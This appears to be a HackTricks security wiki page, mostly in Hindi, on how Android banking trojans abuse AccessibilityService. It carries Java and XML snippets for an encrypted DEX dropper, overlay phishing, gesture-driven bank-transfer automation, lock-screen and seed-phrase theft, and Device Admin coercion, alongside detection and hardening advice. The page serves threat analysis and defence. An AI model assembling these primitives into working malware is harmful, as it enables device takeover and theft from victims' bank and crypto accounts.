# Android Accessibility Service का दुरुपयोग

{{#include ../../banners/hacktricks-training.md}}

## अवलोकन

`AccessibilityService` को विकलांग उपयोगकर्ताओं को Android डिवाइस के साथ इंटरैक्ट करने में मदद करने के लिए बनाया गया था। दुर्भाग्यवश, वही **powerful automation APIs** (global navigation, text input, gesture dispatch, overlay windows…) मालवेयर द्वारा हथियारबंद किए जा सकते हैं ताकि हैंडसेट पर **पूर्ण रिमोट कंट्रोल** प्राप्त किया जा सके _without root privileges_।

आधुनिक Android banking Trojans और Remote-Access-Trojans (RATs) जैसे **PlayPraetor, SpyNote, BrasDex, SOVA, ToxicPanda** और कई अन्य एक ही नुस्खा का पालन करते हैं:

1. Social-engineer करके पीड़ित को एक rogue accessibility service सक्षम करने पर सहमत कराना (the *BIND_ACCESSIBILITY_SERVICE* permission "high-risk" माना जाता है और इसके लिए एक स्पष्ट उपयोगकर्ता क्रिया की आवश्यकता होती है)।
2. सर्विस का उपयोग करके:
* स्क्रीन पर दिखाई देने वाले हर UI event और टेक्स्ट को कैप्चर करना,
* synthetic gestures (`dispatchGesture`) और global actions (`performGlobalAction`) इंजेक्ट करके ऑपरेटर की मनचाही कोई भी टास्क ऑटोमेट करना,
* वैध ऐप्स के ऊपर full-screen overlays ड्रा करना, **TYPE_ACCESSIBILITY_OVERLAY** window type का उपयोग करके (कोई `SYSTEM_ALERT_WINDOW` prompt नहीं!),
* सिस्टम डायलॉग्स पर क्लिक करके पीड़ित की तरफ से अतिरिक्त runtime permissions चुपचाप प्रदान करना।
3. उपयोगकर्ता एक बिल्कुल सामान्य स्क्रीन देख रहा होता है तब रियल-टाइम में डेटा exfiltrate करना या **On-Device-Fraud (ODF)** को अंजाम देना।

---

### Packed Accessibility droppers

ClayRat v3.0.8 अपने Accessibility RAT को `assets/` के अंदर छिपे एक staged payload के साथ मिलाता है। रनटाइम पर होस्ट APK:

1. `assets/*.dat` से encrypted blob को stream करता है।
2. Java/Kotlin loader में एम्बेडेड hard-coded AES/CBC key + IV से इसे decrypt करता है।
3. प्लेनटेक्स्ट DEX को ऐप के private dir में लिखता है और `DexClassLoader` के जरिए लोड करता है, जिससे वास्तविक spyware क्लासेस केवल मेमोरी में एक्सपोज़ होती हैं।
```java
byte[] blob = readAsset("payload.enc");
Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
SecretKeySpec key = new SecretKeySpec(hex("A1..."), "AES");
c.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(iv));
byte[] dex = c.doFinal(blob);
DexClassLoader cl = new DexClassLoader(writeTemp(dex), getCodeCacheDir().getPath(), null, getClassLoader());
cl.loadClass("com.clayrat.Core").newInstance();
```
यह packing pattern (ATT&CK T1406.002) Accessibility module को off-disk रखता है जब तक dropper execute न हो जाए, जिससे static signature scans और Play Protect तब तक बेअसर रहते हैं जब तक उपयोगकर्ता पहले से dangerous permissions प्रदान न कर चुका हो।

---

## अनुमति का अनुरोध
```xml
<!-- AndroidManifest.xml -->
<service
android:name="com.evil.rat.EvilService"
android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
android:exported="false">

<intent-filter>
<action android:name="android.accessibilityservice.AccessibilityService" />
</intent-filter>

<meta-data android:name="android.accessibilityservice"
android:resource="@xml/evil_accessibility_config"/>
</service>
```
संगत XML यह परिभाषित करता है कि नकली डायलॉग कैसा दिखेगा:
```xml
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
android:description="@string/service_description"
android:accessibilityEventTypes="typeAllMask"
android:accessibilityFeedbackType="feedbackGeneric"
android:notificationTimeout="200"
android:canPerformGestures="true"
android:canRetrieveWindowContent="true"/>
```
---

## रिमोट UI स्वचालन के मूलभूत अवयव

<details>
<summary>Accessibility service स्वचालन का बुनियादी ढाँचा</summary>
```java
public class EvilService extends AccessibilityService {
@Override
public void onAccessibilityEvent(AccessibilityEvent event) {
// harvest text or detect foreground app change
}

// Simulate HOME / BACK / RECENTS …
private void navHome()     { performGlobalAction(GLOBAL_ACTION_HOME); }
private void navBack()     { performGlobalAction(GLOBAL_ACTION_BACK); }
private void openRecents() { performGlobalAction(GLOBAL_ACTION_RECENTS); }

// Generic tap / swipe
public void tap(float x, float y) {
Path p = new Path(); p.moveTo(x, y);
GestureDescription.StrokeDescription s = new GestureDescription.StrokeDescription(p, 0, 50);
dispatchGesture(new GestureDescription.Builder().addStroke(s).build(), null, null);
}
}
```
</details>

केवल इन दो APIs के साथ एक हमलावर कर सकता है:
* स्क्रीन अनलॉक करना, बैंकिंग ऐप खोलना, उसके UI tree में नेविगेट करना और एक ट्रांसफ़र फॉर्म सबमिट करना।
* उठने वाले हर अनुमति संवाद को स्वीकार करना।
* अतिरिक्त APKs को Play Store intent के माध्यम से इंस्टॉल/अपडेट करना।

---

## दुरुपयोग पैटर्न

### 1. Overlay Phishing (Credential Harvesting)
एक पारदर्शी या अपारदर्शी `WebView` window manager में जोड़ा जाता है:
```java
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
TYPE_ACCESSIBILITY_OVERLAY,                      // ⬅ bypasses SYSTEM_ALERT_WINDOW
FLAG_NOT_FOCUSABLE | FLAG_NOT_TOUCH_MODAL,       // touches still reach the real app
PixelFormat.TRANSLUCENT);
wm.addView(phishingView, lp);
```
The victim types credentials into the fake form while the background app receives the same gestures – no suspicious "draw over other apps" prompt is ever shown.

> Detailed example: the *Accessibility Overlay Phishing* section inside the Tapjacking page.

ClayRat exposes this capability with the `show_block_screen` / `hide_block_screen` commands that download overlay templates from the C2. Operators can switch layouts on the fly to:

- **Black out** the panel so the victim assumes the handset is off or frozen while automated gestures disable Play Protect or grant more permissions.
- Display fake **system update / battery optimization** panels that justify why the device is “busy” while background automation continues.
- Show an **interactive PIN pad** overlay that mirrors the system lock screen—the malware captures every digit and streams it to the operator as soon as a 4‑digit code is entered.

Because TYPE_ACCESSIBILITY_OVERLAY windows never raise the `SYSTEM_ALERT_WINDOW` permission prompt, the victim only sees the decoy UI while the RAT keeps interacting with the real apps underneath.

### 2. ऑन-डिवाइस धोखाधड़ी स्वचालन
Malware families such as **PlayPraetor** maintain a persistent WebSocket channel where the operator can issue high-level commands (`init`, `update`, `alert_arr`, `report_list`, …).  The service translates those commands into the low-level gestures above, achieving real-time unauthorized transactions that easily bypass multi-factor-authentication tied to that very device.

### 3. स्क्रीन स्ट्रीमिंग & मॉनिटरिंग
ClayRat upgrades the usual MediaProjection trick into a remote desktop stack:

1. `turbo_screen` triggers the MediaProjection consent dialog; the Accessibility service clicks “Start now” so the victim never intervenes.
2. With the resulting `MediaProjection` token it creates a `VirtualDisplay` backed by an `ImageReader`, keeps a `ForegroundService` alive, and drains frames on worker threads.
3. Frames are JPEG/PNG encoded according to the operator-supplied `set_quality` parameter (defaults to `60` when missing) and shipped over an HTTP→WebSocket upgrade advertising the custom `ClayRemoteDesktop` user-agent.
4. `start_desktop` / `stop_desktop` manage the capture threads while `screen_tap`, `screen_swipe`, `input_text`, `press_home`, `press_back` and `press_recents` replay gestures against the live framebuffer.

परिणाम एक VNC-जैसा फ़ीड है जो पूरी तरह अधिकृत APIs के माध्यम से प्रदान किया जाता है—कोई root या kernel exploits नहीं—फिर भी यह हमलावर को मिलीसेकंड लेटेंसी के साथ लाइव परिस्थितिजन्य जागरूकता देता है।

### 4. लॉक-स्क्रीन क्रेडेंशियल चोरी & ऑटो-अनलॉक
ClayRat subscribes to `TYPE_WINDOW_CONTENT_CHANGED` / `TYPE_VIEW_TEXT_CHANGED` events emitted by `com.android.systemui` (`Keyguard`). It reconstructs whatever guard is active:

- **PIN** – watches keypad button presses until the locker reports completion.
- **Password** – concatenates strings seen in the focused password field for each `AccessibilityEvent`.
- **Pattern** – records the ordered node indices inferred from gesture coordinates across the 3×3 grid.

Secrets plus metadata (lock type + timestamp) are serialized into `SharedPreferences` under `lock_password_storage`. When the operator pushes `auto_unlock`, the service wakes the device with `unlock_device` / `screen_on`, replays the stored digits or gestures through `dispatchGesture`, and silently bypasses the keyguard so subsequent ODF workflows can continue.

### 5. नोटिफिकेशन फिशिंग & हार्वेस्टिंग
A companion Notification Listener turns the shade into a phishing surface:

- `get_push_notifications` dumps every currently visible notification, including OTP / MFA messages.
- The `notifications` command toggles a `notifications_enabled` flag so each future `onNotificationPosted()` payload is streamed to the C2 in real time.
- `send_push_notification` lets operators craft fake, interactive notifications that impersonate banking or chat apps; any text the victim submits is parsed as credentials and exfiltrated immediately.

क्योंकि Accessibility प्रोग्रामेटिकली notification shade खोल/बंद कर सकता है, यह तरीका लक्षित ऐप्स को छुए बिना ही सीक्रेट्स हार्वेस्ट कर लेता है।

### 6. टेलीफ़ोनी & SMS कमांड चैनल
After coercing the user into setting the RAT as the default SMS app, the following commands provide complete modem control:

- `send_sms` and `retransmishion` send arbitrary or replayed messages to attacker-controlled numbers.
- `messsms` iterates over the entire contacts database to spam phishing links for worm-like propagation.
- `make_call` initiates voice calls that support social-engineering workflows.
- `get_sms_list` / `get_sms` and `get_call_log` / `get_calls` dump inboxes and call history so MFA codes or call metadata can be abused instantly.

Accessibility-driven UI navigation के साथ मिलकर, ClayRat नोटिफिकेशन/SMS के जरिए OTP प्राप्त कर सकता है और उसे तत्क्षण लक्ष्य बैंकिंग या एंटरप्राइज़ ऐप में इनपुट करवा सकता है।

### 7. डिस्कवरी, कलेक्शन & प्रॉक्सीइंग
Additional ClayRat commands map the environment and keep C2 resilient:

- `get_apps` / `get_apps_list` enumerate installed packages (ATT&CK T1418).
- `get_device_info` reports model, OS version and battery state (T1426).
- `get_cam` / `get_camera` capture front-camera stills, while `get_keylogger_data` serializes lock PINs plus passwords, view descriptions and hints scraped from sensitive fields.
- `get_proxy_data` fetches a proxy WebSocket URL, appends the unique device ID and spins a job that tunnels HTTP/HTTPS over the same bidirectional channel (T1481.002 / T1646).

---

## PlayPraetor – कमांड & कंट्रोल वर्कफ़्लो

1. **HTTP(S) heartbeat** – iterate over a hard-coded list until one domain answers `POST /app/searchPackageName` with the active C2.
2. **WebSocket (port 8282)** – bidirectional JSON commands:
* `update` – push new conf/APKs
* `alert_arr` – configure overlay templates
* `report_list` – send list of targeted package names
* `heartbeat_web` – keep-alive
3. **RTMP (port 1935)** – live screen/video streaming.
4. **REST exfiltration** –
* `/app/saveDevice` (fingerprint)
* `/app/saveContacts` | `/app/saveSms` | `/app/uploadImageBase64`
* `/app/saveCardPwd` (bank creds)

The **AccessibilityService** is the local engine that turns those cloud commands into physical interactions.

---

## मालिशियस accessibility services का पता लगाना

* `adb shell settings get secure enabled_accessibility_services`
* Settings → Accessibility → *Downloaded services* – उन ऐप्स को देखें जो Google Play से **नहीं** हैं।
* MDM / EMM solutions can enforce `ACCESSIBILITY_ENFORCEMENT_DEFAULT_DENY` (Android 13+) to block sideloaded services.
* Analyse running services:
```bash
adb shell dumpsys accessibility | grep "Accessibility Service"
```

---

## ऐप डेवलपर्स के लिए हार्डेनिंग सिफारिशें

* Mark sensitive views with `android:accessibilityDataSensitive="accessibilityDataPrivateYes"` (API 34+).
* Combine `setFilterTouchesWhenObscured(true)` with `FLAG_SECURE` to prevent tap/overlay hijacking.
* Detect overlays by polling `WindowManager.getDefaultDisplay().getFlags()` or the `ViewRootImpl` API.
* Refuse to operate when `Settings.canDrawOverlays()` **or** a non-trusted Accessibility service is active.

---

## ATS automation cheat-sheet (Accessibility-driven)
Malware can fully automate a bank app with only Accessibility APIs. Generic primitives:

<details>
<summary>ATS automation के लिए हेल्पर मेथड्स</summary>
```java
// Helpers inside your AccessibilityService
private List<AccessibilityNodeInfo> byText(String t){
AccessibilityNodeInfo r = getRootInActiveWindow();
return r == null ? Collections.emptyList() : r.findAccessibilityNodeInfosByText(t);
}
private boolean clickText(String t){
for (AccessibilityNodeInfo n: byText(t)){
if (n.isClickable()) return n.performAction(ACTION_CLICK);
AccessibilityNodeInfo p = n.getParent();
if (p != null) return p.performAction(ACTION_CLICK);
}
return false;
}
private void inputText(AccessibilityNodeInfo field, String text){
Bundle b = new Bundle(); b.putCharSequence(ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
field.performAction(ACTION_SET_TEXT, b);
}
private void tap(float x, float y){
Path p = new Path(); p.moveTo(x,y);
dispatchGesture(new GestureDescription.Builder()
.addStroke(new GestureDescription.StrokeDescription(p,0,40)).build(), null, null);
}
```
</details>

उदाहरण प्रवाह (Czech → English labels):
- "Nová platba" (नया भुगतान) → क्लिक
- "Zadat platbu" (भुगतान दर्ज करें) → क्लिक
- "Nový příjemce" (नया प्राप्तकर्ता) → क्लिक
- "Domácí číslo účtu" (घरेलू खाता संख्या) → फोकस और `ACTION_SET_TEXT`
- "Další" (अगला) → क्लिक → … "Zaplatit" (भुगतान करें) → क्लिक → PIN दर्ज करें

Fallback: कस्टम विजेट्स के कारण टेक्स्ट लुकअप असफल होने पर हार्ड-कोडेड निर्देशांकों के साथ `dispatchGesture`।

Also seen: limits UI पर नेविगेट करके और transfer से पहले दैनिक सीमाओं को बढ़ाने के लिए `check_limit` और `limit` के प्री-स्टेप्स।

## टेक्स्ट-आधारित pseudo-screen स्ट्रीमिंग
कम-लेटेंसी रिमोट कंट्रोल के लिए, पूरी वीडियो स्ट्रीमिंग के बजाय, वर्तमान UI tree का टेक्स्टुअल प्रतिनिधित्व डम्प करके उसे बार-बार C2 पर भेजें।
```java
private void dumpTree(AccessibilityNodeInfo n, String indent, StringBuilder sb){
if (n==null) return;
Rect b = new Rect(); n.getBoundsInScreen(b);
CharSequence txt = n.getText(); CharSequence cls = n.getClassName();
sb.append(indent).append("[").append(cls).append("] ")
.append(txt==null?"":txt).append(" ")
.append(b.toShortString()).append("\n");
for (int i=0;i<n.getChildCount();i++) dumpTree(n.getChild(i), indent+"  ", sb);
}
```
यह `txt_screen` (एक-बार) और `screen_live` (लगातार) जैसे कमांड्स का आधार है।

## Device Admin coercion primitives
एक बार Device Admin receiver सक्रिय हो जाने पर, ये कॉल्स credentials कैप्चर करने और नियंत्रण बनाए रखने के अवसर बढ़ा देती हैं:
```java
DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
ComponentName admin = new ComponentName(this, AdminReceiver.class);

// 1) Immediate lock
dpm.lockNow();

// 2) Force credential change (expire current PIN/password)
dpm.setPasswordExpirationTimeout(admin, 1L); // may require owner/profile-owner on recent Android

// 3) Disable biometric unlock to force PIN/pattern entry
int flags = DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS;
dpm.setKeyguardDisabledFeatures(admin, flags);
```
Note: इन नीतियों की सटीक उपलब्धता Android वर्ज़न और OEM के अनुसार बदल सकती है; परीक्षण के दौरान device policy role (admin vs owner) को वेरिफाई करें।

## क्रिप्टो वॉलेट seed-phrase extraction पैटर्न
MetaMask, Trust Wallet, Blockchain.com और Phantom के लिए देखे गए फ्लो:
- चोरी किए गए PIN (captured via overlay/Accessibility) या दिए गए wallet password से अनलॉक करें।
- नेविगेट करें: Settings → Security/Recovery → Reveal/Show recovery phrase.
- phrase को collect करें: keylogging the text nodes, secure-screen bypass, या टेक्स्ट छिपा होने पर screenshot OCR के माध्यम से।
- Selectors को स्थिर करने के लिए multiple locales (EN/RU/CZ/SK) को सपोर्ट करें – उपलब्ध होने पर `viewIdResourceName` को प्राथमिकता दें, अन्यथा multilingual text matching पर fallback करें।

## NFC-relay orchestration
Accessibility/RAT modules तीसरे चरण के रूप में एक dedicated NFC-relay app (उदाहरण के लिए NFSkate) install और launch कर सकते हैं और victim को card-present relay steps के माध्यम से मार्गदर्शन करने के लिए एक overlay guide भी inject कर सकते हैं।

पृष्ठभूमि और TTPs: https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay

---

## References
* [Return of ClayRat: Expanded Features and Techniques](https://zimperium.com/blog/return-of-clayrat-expanded-features-and-techniques)
* [ClayRat v3 IoCs (Zimperium)](https://github.com/Zimperium/IOC/tree/master/2025-12-ClayRatv3)
* [PlayPraetor’s evolving threat: How Chinese-speaking actors globally scale an Android RAT](https://www.cleafy.com/cleafy-labs/playpraetors-evolving-threat-how-chinese-speaking-actors-globally-scale-an-android-rat)
* [Android accessibility documentation – Automating UI interaction](https://developer.android.com/guide/topics/ui/accessibility/service)
* [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
* [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}
